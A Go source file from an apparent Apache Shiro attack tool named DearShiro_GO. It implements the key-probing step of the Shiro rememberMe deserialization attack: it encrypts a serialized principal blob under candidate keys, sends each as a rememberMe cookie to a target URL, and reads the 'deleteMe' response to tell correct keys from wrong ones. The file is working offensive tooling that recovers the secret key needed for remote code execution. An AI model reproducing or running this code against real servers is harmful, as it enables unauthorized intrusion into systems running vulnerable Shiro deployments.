package conn

import (
	"DearShiro_GO/core/data"
	"DearShiro_GO/core/util"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
)

type ShiroConnection struct {
	BaseUrl string
}

func NewShiroConnection(url string) *ShiroConnection {
	return &ShiroConnection{BaseUrl: url}
}

var reg, _ = regexp.Compile(".*rememberMe=deleteMe.*")
var buffer, _ = hex.DecodeString(data.SimplePrincipalCollectionHex)

func (this *ShiroConnection) CheckFalseKey(key []byte) bool {
	rememberMe, err := util.GetRememberMe(key, buffer)
	if err != nil {
		return true
	}

	urlBase, err := url.Parse(this.BaseUrl)
	if err != nil {
		fmt.Println(err)
		return true
	}

	header := &http.Header{}
	header.Add("Content-Type", "application/x-www-form-urlencoded")
	header.Add("Cookie", "rememberMe="+rememberMe)

	request := &http.Request{
		URL:    urlBase,
		Method: http.MethodGet,
		Header: *header,
	}

	client := new(http.Client)
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
		return true
	}
	fmt.Println("[+]Test Key: " + string(key))
	fmt.Println("[-]Response Code: " + strconv.Itoa(response.StatusCode))

	return reg.MatchString(response.Header.Get("Set-Cookie"))
}
